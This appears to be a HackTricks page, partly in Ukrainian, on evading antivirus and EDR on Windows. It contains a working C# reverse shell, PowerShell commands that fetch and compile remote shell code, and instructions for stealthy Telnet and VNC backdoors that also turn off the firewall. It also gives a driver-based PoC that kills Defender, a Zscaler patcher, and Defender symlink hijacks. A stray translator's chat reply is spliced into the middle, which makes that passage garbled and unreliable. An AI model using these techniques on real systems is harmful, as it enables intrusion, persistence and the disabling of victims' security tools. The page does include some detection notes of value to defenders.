## TokenStomping

Token stomping — це техніка, яка дозволяє нападнику **маніпулювати access token або продуктом безпеки, таким як EDR чи AV**, знижуючи його привілеї так, щоб процес не помер, але не мав дозволів для перевірки на наявність шкідливої активності.

Щоб запобігти цьому, Windows могла б **заборонити зовнішнім процесам** отримувати дескриптори токенів процесів безпеки.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Як описано в [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), дуже просто розгорнути Chrome Remote Desktop на ПК жертви і використати його для takeover та підтримки persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin without using the GUI).


## Advanced Evasion

Evasion — дуже складна тема; іноді потрібно враховувати багато джерел телеметрії в одній системі, тому практично неможливо залишатися повністю непоміченим у зрілих середовищах.

Кожне середовище, з яким ви стикаєтесь, матиме свої сильні та слабкі сторони.

Я настійно рекомендую переглянути цей доклад від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати уявлення про більш просунуті техніки Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це також чудовий доклад від [@mariuszbit](https://twitter.com/mariuszbit) про Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Ви можете використати [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який буде **видаляти частини бінарника** поки не **виявить, яка частина Defender** позначає як шкідливу, і повідомить вам це.\
Інший інструмент, що робить **те саме**, — [**avred**](https://github.com/dobin/avred) з відкритою веб-службою на [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10 всі версії Windows поставлялися з можливістю встановити **Telnet server**, який ви могли інсталювати (від імені адміністратора), роблячи:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Я можу перекласти вміст src/windows-hardening/av-bypass.md на українську. Будь ласка, вставте сюди вміст файлу, який потрібно перекласти.

Якщо ви натомість маєте на увазі: «Make it start when the system is started and run it now» — уточніть, для якої ОС це (Linux systemd чи Windows service) і надайте скрипт/файл або команду, яку треба зробити автозапуском; тоді я надам точні інструкції.
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Змінити telnet port** (стелс) та вимкнути firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (вам потрібні bin-завантаження, а не інсталятор)

**НА ХОСТІ**: Запустіть _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть опцію _Disable TrayIcon_
- Встановіть пароль у _VNC Password_
- Встановіть пароль у _View-Only Password_

Потім перемістіть бінарник _**winvnc.exe**_ і **новостворений** файл _**UltraVNC.ini**_ у **жертву**

#### **Зворотне з'єднання**

**Атакуючий** має **запустити на своєму хості** бінарник `vncviewer.exe -listen 5900`, щоб він був **готовий** прийняти зворотне **VNC-з'єднання**. Потім, на **жертві**: Запустіть демон winvnc `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**УВАГА:** Щоб зберегти прихованість, не робіть наступного

- Не запускайте `winvnc`, якщо він уже запущений, інакше ви викличете [спливаюче вікно](https://i.imgur.com/1SROTTl.png). Перевірте, чи запущено процес командою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` у тій же директорії, інакше відкриється [вікно налаштувань](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` за довідкою, інакше викличете [спливаюче вікно](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Всередині GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Тепер **запустіть lister** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Поточний Defender дуже швидко завершить процес.**

### Компіляція власного reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Використовуйте це з:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using компілятор
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список обфускаторів для C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Приклад використання python для створення інжекторів:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Більше

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – вимикання AV/EDR з рівня ядра

Storm-2603 використовував невелику консольну утиліту відому як **Antivirus Terminator** для вимкнення endpoint-захисту перед завданням ransomware. Інструмент приносить свій **вразливий, але *підписаний* драйвер** та зловживає ним для виконання привілейованих операцій у ядрі, які навіть Protected-Process-Light (PPL) AV сервіси не можуть заблокувати.

Ключові висновки
1. **Підписаний драйвер**: Файл, записаний на диск — `ServiceMouse.sys`, але бінарник — легітимно підписаний драйвер `AToolsKrnl64.sys` з Antiy Labs’ “System In-Depth Analysis Toolkit”. Оскільки драйвер має дійсний підпис Microsoft, він завантажується навіть коли Driver-Signature-Enforcement (DSE) увімкнено.
2. **Встановлення сервісу**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Перший рядок реєструє драйвер як **kernel service**, а другий запускає його, щоб `\\.\ServiceMouse` став доступним з user land.
3. **IOCTLи, що експонуються драйвером**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Завершити довільний процес за PID (використовується для вбивства Defender/EDR сервісів) |
| `0x990000D0` | Видалити довільний файл на диску |
| `0x990001D0` | Вивантажити драйвер та видалити сервіс |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Чому це працює**: BYOVD повністю обходить user-mode захисти; код, що виконується в ядрі, може відкривати *protected* процеси, завершувати їх або змінювати об'єкти ядра незалежно від PPL/PP, ELAM або інших механізмів жорсткості.

Виявлення / Мітігація
•  Увімкніть Microsoft’s vulnerable-driver block list (`HVCI`, `Smart App Control`), щоб Windows відмовлявся завантажувати `AToolsKrnl64.sys`.
•  Моніторьте створення нових *kernel* сервісів та сповіщайте, коли драйвер завантажується з директорії з правами запису для всіх користувачів або відсутній в allow-list.
•  Слідкуйте за user-mode хендлами на кастомні device objects з подальшими підозрілими викликами `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** застосовує правила device-posture локально і покладається на Windows RPC для передавання результатів іншим компонентам. Два слабкі дизайнерські рішення роблять можливим повний обхід:

1. Оцінка posture відбувається **повністю на клієнті** (булеве значення відправляється на сервер).
2. Внутрішні RPC endpoints перевіряють лише те, що підключуваний виконуваний файл **підписаний Zscaler** (через `WinVerifyTrust`).

Патчингом чотирьох підписаних бінарників на диску можна нейтралізувати обидва механізми:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тож кожна перевірка вважається compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ будь-який (навіть unsigned) процес може прив'язатися до RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Обійдено |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Після заміни оригінальних файлів і перезапуску стеку сервісів:

* **Усі** перевірки стану відображаються **зелені/відповідні**.
* Непідписані або змінені бінарні файли можуть відкривати іменовані кінцеві точки RPC (наприклад `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Скомпрометований хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей кейс демонструє, як виключно клієнтські рішення довіри і прості перевірки підписів можна обійти кількома байтовими патчами.

## Зловживання Protected Process Light (PPL) для втручання в AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) впроваджує ієрархію підписувачів/рівнів, так що лише захищені процеси з однаковим або вищим рівнем можуть втручатися один в одного. Зловмисно, якщо ви можете легітимно запустити PPL-увімкнений бінарний файл і контролювати його аргументи, ви можете перетворити нешкідливу функціональність (наприклад, логування) на обмежений записувальний примітив, підкріплений PPL, проти захищених директорій, які використовуються AV/EDR.

Що змушує процес працювати як PPL
- Цільовий EXE (і будь-які завантажені DLL) повинні бути підписані з EKU, сумісним з PPL.
- Процес має бути створений через CreateProcess з прапорами: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Потрібно запитати сумісний рівень захисту, що відповідає підписувачу бінарника (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для підписувачів антивірусів, `PROTECTION_LEVEL_WINDOWS` для підписувачів Windows). Невірні рівні призведуть до помилки при створенні.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Помічник із відкритим кодом: CreateProcessAsPPL (вибирає рівень захисту та пересилає аргументи цільовому EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Приклад використання:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN примітив: ClipUp.exe
- Підписаний системний двійковий файл `C:\Windows\System32\ClipUp.exe` самозапускається та приймає параметр для запису лог-файлу у шлях, вказаний викликачем.
- При запуску як PPL-процес запис файлу виконується з підтримкою PPL.
- ClipUp не може розбирати шляхи, що містять пробіли; використовуйте 8.3 короткі шляхи, щоб вказати на зазвичай захищені локації.

8.3 short path helpers
- Перегляд коротких імен: `dir /x` у кожному батьківському каталозі.
- Отримати короткий шлях в cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Запустіть LOLBIN, здатний до PPL (ClipUp), з `CREATE_PROTECTED_PROCESS` за допомогою лаунчера (наприклад, CreateProcessAsPPL).
2) Передайте ClipUp аргумент log-path, щоб примусити створення файлу в захищеному каталозі AV (наприклад, Defender Platform). За потреби використовуйте 8.3 короткі імена.
3) Якщо цільовий двійковий файл зазвичай відкритий/заблокований AV під час роботи (наприклад, MsMpEng.exe), заплануйте запис при завантаженні до того, як AV запуститься, встановивши автозапускну службу, яка гарантовано виконується раніше. Перевірте порядок завантаження за допомогою Process Monitor (boot logging).
4) Після перезавантаження запис з підтримкою PPL відбувається до того, як AV заблокує свої двійкові файли, пошкоджуючи цільовий файл і перешкоджаючи запуску.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Ви не контролюєте вміст, який записує `ClipUp`, окрім його розташування; примітив підходить більше для корупції ніж для точного інжектування контенту.
- Потребується локальний admin/SYSTEM для встановлення/запуску сервісу та вікно для перезавантаження.
- Таймінг критичний: ціль не повинна бути відкрита; виконання під час завантаження уникне блокувань файлів.

Detections
- Створення процесу `ClipUp.exe` з незвичними аргументами, особливо якщо батьківський процес — нестандартний лаунчер, під час завантаження.
- Нові сервіси, налаштовані на автостарт під підозрілі бінарі, які послідовно стартують до Defender/AV. Досліджуйте створення/зміну сервісів до помилок запуску Defender.
- Моніторинг цілісності файлів у Defender бінарях/Platform директоріях; несподівані створення/зміни файлів процесами з прапорцями protected-process.
- ETW/EDR телеметрія: звертайте увагу на процеси, створені з `CREATE_PROTECTED_PROCESS` та аномальне використання PPL рівнів не-AV бінарями.

Mitigations
- WDAC/Code Integrity: обмежте, які підписані бінарі можуть працювати як PPL і під якими батьками; блокувати виклик ClipUp поза легітимними контекстами.
- Service hygiene: обмежте створення/зміни авто-старт сервісів та моніторте маніпуляції порядком запуску.
- Забезпечте ввімкненість Defender tamper protection та early-launch protections; розслідуйте помилки запуску, що вказують на корупцію бінарів.
- Розгляньте вимкнення генерації коротких імен 8.3 на томах, де розміщені інструменти безпеки, якщо це сумісно з вашим середовищем (ретельно тестуйте).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

Preconditions
- Local Administrator (needed to create directories/symlinks under the Platform folder)
- Ability to reboot or trigger Defender platform re-selection (service restart on boot)
- Only built-in tools required (mklink)

Why it works
- Defender блокує записи у власних папках, але його вибір платформи довіряє записам директорій і обирає лексикографічно найвищу версію без перевірки, чи резольвиться ціль у захищений/довірений шлях.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть symlink каталогу вищої версії всередині Platform, що вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір trigger (рекомендується перезавантаження):
```cmd
shutdown /r /t 0
```
4) Переконайтеся, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Ви повинні побачити новий шлях процесу під `C:\TMP\AV\` та конфігурацію служби/реєстру, які відображають це розташування.

Post-exploitation options
- DLL sideloading/code execution: Скинути або замінити DLLs, які Defender завантажує зі свого каталогу застосунку, щоб виконати код у процесах Defender. Див. розділ вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Видаліть version-symlink, щоб при наступному запуску налаштований шлях не розпізнавався і Defender не зміг запуститися:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Зауважте, що ця техніка сама по собі не забезпечує підвищення привілеїв; вона потребує прав адміністратора.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams можуть винести runtime evasion з C2 implant у сам цільовий модуль, хукаючи його Import Address Table (IAT) і перенаправляючи вибрані APIs через контрольований атакуючим, position‑independent code (PIC). Це узагальнює обхід виявлення за межі невеликої API-поверхні, яку багато kits експонують (наприклад, CreateProcessA), і поширює ті самі захисти на BOFs і post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
  - Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
  - Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Примітки
- Apply the patch після релокацій/ASLR і перед першим використанням імпорту. Reflective loaders like TitanLdr/AceLdr демонструють hooking під час DllMain завантаженого модуля.
- Keep wrappers tiny і PIC-safe; розв’язуйте справжній API через оригінальне значення IAT, яке ви захопили перед патчем, або через LdrGetProcedureAddress.
- Використовуйте переходи RW → RX для PIC і уникайте залишати writable+executable сторінки.

Call‑stack spoofing stub
- Draugr‑style PIC stubs будують фіктивний ланцюг викликів (адреси повернення, що вказують на benign modules) і потім переходять у реальний API.
- Це обходить детекції, які очікують канонічні стеки від Beacon/BOFs до чутливих API.
- Комбінуйте з техніками stack cutting/stack stitching, щоб опинятися всередині очікуваних фреймів перед прологом API.

Operational integration
- Prepend the reflective loader до post‑ex DLLs, щоб PIC і hooks ініціалізувалися автоматично при завантаженні DLL.
- Використовуйте Aggressor script для реєстрації цільових API, щоб Beacon і BOFs прозоро користувалися тим самим шляхом ухилення без змін коду.

Detection/DFIR considerations
- IAT integrity: записи, що резольвляться в non‑image (heap/anon) адреси; періодична верифікація імпортних вказівників.
- Stack anomalies: адреси повернення, які не належать завантаженим образам; різкі переходи до non‑image PIC; невідповідне походження RtlUserThreadStart.
- Loader telemetry: in‑process записи в IAT, рання активність DllMain, яка модифікує import thunks, несподівані RX регіони, створені при завантаженні.
- Image‑load evasion: якщо hooking LoadLibrary*, моніторте підозрілі завантаження automation/clr assemblies, що корелюють із memory masking подіями.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
